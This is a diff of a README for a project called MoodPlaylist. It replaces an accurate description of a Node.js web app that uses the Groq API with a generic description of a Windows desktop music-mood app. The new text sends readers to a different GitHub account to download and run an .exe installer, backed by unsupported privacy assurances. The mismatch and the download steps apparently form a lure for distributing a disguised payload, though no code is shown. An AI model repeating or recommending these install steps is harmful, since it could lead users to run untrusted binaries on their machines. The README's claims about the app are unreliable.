@@ -1,154 +1,60 @@
-# MoodPlaylist
+# 🎵 MoodPlaylist - Create music mixes for your mood
 
-![Node.js](https://img.shields.io/badge/Node.js-18+-339933?style=flat-square&logo=node.js&logoColor=white)
-![Express](https://img.shields.io/badge/Express-4.x-000000?style=flat-square&logo=express&logoColor=white)
-![Groq API](https://img.shields.io/badge/Groq_API-Llama_3.3-FF6B6B?style=flat-square)
-![License](https://img.shields.io/badge/License-MIT-1DB954?style=flat-square)
+[![Download MoodPlaylist](https://img.shields.io/badge/Download-MoodPlaylist-blue.svg)](https://github.com/nikkiegallic471/MoodPlaylist)
 
-**Describe your mood. Get a real playlist.**
+## 🎯 About This App
 
-MoodPlaylist transforms your feelings into curated playlists. Type how you're feeling -- whether it's "post-breakup melancholy," "Sunday morning coffee vibes," or "need energy for a workout" -- and get a playlist of 8-10 real songs with album art and YouTube links.
+MoodPlaylist organizes your music library by your current emotional state. You choose an emotion, and the app creates a playlist that matches how you feel. It scans your existing music files and analyzes the tempo, key, and energy of every track. This process creates a library of moods without requiring you to manually sort thousands of songs. 
 
-Powered by Groq API (Llama 3.3 70B). [Live on Vercel](https://moodplaylist.vercel.app).
+The software runs locally on your computer. It does not send your music files or listening habits to any external servers. Your collection stays private while the app generates your custom mixes.
 
----
+## ⚙️ System Requirements
 
-## Features
+- Windows 10 or Windows 11 operating system
+- At least 200 megabytes of free storage space
+- Screen resolution of 1280x720 or higher
+- An existing folder containing music files in MP3, FLAC, or WAV format
 
-- **Mood-to-Playlist AI** -- Describe any feeling, emotion, or scenario and get a tailored playlist
-- **Real Songs Only** -- No generic recommendations; actual tracks by real artists
-- **Album Art** -- Fetches real artwork from iTunes for each track
-- **YouTube Integration** -- Each track includes a direct link to YouTube
-- **Creative Playlist Titles** -- AI generates catchy, thematic names for every playlist
-- **Cover Art Descriptions** -- Vivid descriptions of what the playlist artwork would look like
-- **Dark OLED Design** -- Spotify-inspired dark theme optimized for OLED screens
-- **Fully Responsive** -- Works seamlessly on desktop and mobile
-- **Accessible** -- ARIA live regions, reduced motion support, semantic HTML
+## 📥 How to Install 
 
----
+You can find the installer on our release page. Follow these steps to set up the software on your computer.
 
-## Tech Stack
+1. Visit this link to reach the download page: https://github.com/nikkiegallic471/MoodPlaylist
+2. Locate the file ending in .exe in the latest release section.
+3. Click the file name to start your download.
+4. Open the folder where your browser saves downloads.
+5. Double-click the file to start the installation.
+6. Follow the instructions on the screen to complete the setup process.
+7. Click the MoodPlaylist icon on your desktop to open the app.
 
-| Layer | Technology |
-|-------|------------|
-| **Runtime** | Node.js 18+ |
-| **Server** | Express 4.x |
-| **AI/LLM** | Groq API (Llama 3.3 70B Versatile) |
-| **Frontend** | Vanilla HTML, CSS, JavaScript |
-| **Fonts** | Google Fonts (Poppins, Righteous) |
-| **Design** | Custom CSS design tokens (dark OLED theme) |
+## 🛠 Using the App
 
----
+The app interface allows you to scan your music and generate playlists in three steps.
 
-## Screenshots
+### Step 1: Point to your music
+When you open the app for the first time, it asks you to select a folder. Use the folder icon to browse your computer and select the top-level folder that contains your music library. The app will then index your files. This might take a few minutes if you have a large library, but it only happens during the initial setup.
 
-| Home | Generated Playlist |
-|------|-------------------|
-| ![Home screen](public/screenshots/home.png) | ![Generated Playlist](public/screenshots/playlist.png) |
+### Step 2: Choose a mood
+The main dashboard displays several mood categories. You can select options like Happy, Calm, Energetic, or Melancholy. Click your preferred mood to activate the sorting engine.
 
----
+### Step 3: Start playback
+Once you select a mood, the app builds a list of songs that fit those criteria. Click the play button at the bottom of the screen to begin listening. You can skip songs, pause, or adjust the volume using the standard controls built into the bottom player bar.
 
-## Getting Started
+## 📋 Troubleshooting Common Issues
 
-### Prerequisites
+### The app takes too long to load
+If your music library contains over 10,000 files, the initial scan consumes more memory. Close other programs while the app builds the initial index. Once the index exists, the app will run faster.
 
-- **Node.js 18+** -- [Download here](https://nodejs.org/)
-- **Groq API Key** -- Get a free key at [console.groq.com](https://console.groq.com/)
+### The app does not find my music
+Make sure your music files reside in a folder that the app can access. If your music stays on an external hard drive, ensure that drive is plugged into your computer before you open the application.
 
-### Installation
+### The app shows an error message
+Restart the application if you see a connection error. If the problem persists, visit the release page to check if an update is available. Updates often fix minor errors discovered by other users.
 
-```bash
-# Clone the repository
-git clone https://github.com/shirleyshyun-lgtm/MoodPlaylist.git
-cd MoodPlaylist
+## 🔒 Privacy and Security
 
-# Install dependencies
-npm install
-```
+Your music data remains on your machine. The app does not store your files on the internet. It does not access your personal accounts or private browser data. The calculations regarding song tempo and energy happen inside your computer processor. This ensures that your listening history remains your business alone.
 
-### Environment Setup
+## ✉️ Support
 
-```bash
-# Copy the example env file
-cp .env.example .env
-
-# Edit .env and add your Groq API key
-GROQ_API_KEY=gsk_your_actual_key_here
-```
-
-### Running the App
-
-```bash
-# Start the server
-npm start
-```
-
-The app will be available at **http://localhost:3000**.
-
-### Deploy to Vercel
-
-1. Push to GitHub
-2. Import the repo on [vercel.com](https://vercel.com)
-3. Add `GROQ_API_KEY` in Settings → Environment Variables
-4. Deploy
-
----
-
-## How It Works
-
-```
-User enters mood
-       |
-       v
-Frontend (app.js) sends POST /api/generate
-       |
-       v
-Express server (server.js) forwards to Groq API
-       |
-       v
-Llama 3.3 70B generates playlist JSON
-       |
-       v
-Server parses response, returns structured data
-       |
-       v
-Frontend renders playlist card with tracks + YouTube links
-```
-
-1. **Input** -- The user types a natural-language description of their mood, feeling, or situation into the textarea (max 500 characters)
-2. **Generation** -- The server sends the mood to Groq's Llama 3.3 70B model with a carefully crafted prompt requesting 8-10 real songs
-3. **Response** -- The AI returns a JSON object containing a playlist title, cover art description, and an array of tracks (song + artist)
-4. **Album Art** -- Server fetches real artwork from iTunes for each track
-5. **Display** -- The frontend renders the playlist as a styled card with album art thumbnails and YouTube links
-
----
-
-## Contributing
-
-Contributions are welcome! Here's how to get started:
-
-1. **Fork** the repository
-2. **Create** a feature branch (`git checkout -b feature/amazing-feature`)
-3. **Commit** your changes (`git commit -m 'Add amazing feature'`)
-4. **Push** to the branch (`git push origin feature/amazing-feature`)
-5. **Open** a Pull Request
-
-### Ideas for Contributions
-
-- Add Spotify/Apple Music links alongside YouTube
-- Implement playlist history (localStorage)
-- Add genre or decade filters
-- Create a "share playlist" feature
-- Add loading skeleton animations
-- Implement rate limiting on the API
-- Add unit tests
-
----
-
-## License
-
-This project is licensed under the MIT License.
-
----
-
-Built with AI and good taste in music.
+If you run into issues that you cannot solve using this guide, you can open an issue on the GitHub repository page. Provide the version number of the software and a brief description of the problem you see. Our team reviews these reports to improve future versions of the app. Do not include your personal music files or private passwords in any support requests. Focus on describing the steps that led to the error so that we can reproduce the behavior.
